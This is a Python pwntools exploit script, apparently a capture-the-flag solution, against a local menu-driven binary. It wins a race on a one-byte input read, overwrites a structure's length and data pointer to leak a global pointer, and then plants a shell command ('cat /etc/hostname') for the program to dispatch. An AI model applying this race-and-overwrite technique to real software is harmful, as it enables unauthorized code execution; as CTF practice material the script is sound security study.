from pwn import *
import random
import re
import time


context.binary = exe = ELF("./attachments/pwn", checksec=False)
ld = "./attachments/ld-linux-x86-64.so.2"
CAPSULE_PTR = 0x4041F8
WAITS = [0.20, 0.22, 0.24, 0.30]
CMD = b"cat /etc/hostname\x00"


def start():
    io = process([ld, "--library-path", "./attachments", "./attachments/pwn"])
    io.recvuntil(b"> ")
    return io


def menu(io, n):
    io.sendline(str(n).encode())


def prep(io):
    menu(io, 2)
    io.send(b"B" * 0x30)
    io.recvuntil(b"forge committed")
    io.recvuntil(b"> ")
    menu(io, 3)
    io.recvuntil(b"actuator ready")
    io.recvuntil(b"> ")
    menu(io, 1)
    io.sendlineafter(b"appeal target (0x20-0x78)> ", b"0x78")
    io.recvuntil(b"supremacy.\n")
    io.recvuntil(b"> ")


def payload_for(lane, length, data_ptr, inline=b""):
    payload = bytearray(b"A" * 0x88)
    payload[:8] = b"sentinel"
    payload[0x30:0x38] = p64(0)
    payload[0x38:0x40] = p64(0x51)
    payload[0x50:0x54] = p32(lane)
    payload[0x58:0x60] = p64(length)
    payload[0x60:0x68] = p64(data_ptr)
    payload[0x68:0x88] = inline[:0x20].ljust(0x20, b"\x00")
    return bytes(payload)


def arm_until(io, lane, length, data_ptr, inline=b"", rounds=80):
    for _ in range(rounds):
        waits = WAITS[:]
        random.shuffle(waits)
        for base in waits:
            menu(io, 2)
            io.recvuntil(b"forge primer (1 byte)> ")
            time.sleep(max(0.0, base + random.uniform(-0.008, 0.008)))
            payload = payload_for(lane, length, data_ptr, inline)
            io.send(payload[:1])
            io.send(payload[1:])
            io.recvuntil(b"forge committed")
            io.recvuntil(b"> ")
            menu(io, 7)
            blob = io.recvuntil(b"> ")
            if re.search(rb"lane=%d len=%#x" % (lane, length), blob):
                return
    raise RuntimeError("race miss")


def leak(io, addr):
    arm_until(io, 0, 8, addr)
    menu(io, 6)
    blob = io.recvuntil(b"[dispatch complete]\n")
    blob += io.recvuntil(b"> ")
    lane_hdr = blob.find(b"]\n")
    done = blob.find(b"\n[dispatch complete]\n")
    return blob[lane_hdr + 2:done]


def main():
    io = start()
    try:
        prep(io)
        capsule = u64(leak(io, CAPSULE_PTR))
        print("capsule", hex(capsule))
        for delta in [0x68, 0x58, 0x60, 0x70]:
            target = capsule + delta
            arm_until(io, 0, len(CMD), target, inline=CMD)
            menu(io, 6)
            blob = io.recvuntil(b"[dispatch complete]\n")
            print(hex(delta), repr(blob))
            io.recvuntil(b"> ")
    finally:
        io.close()


if __name__ == "__main__":
    main()
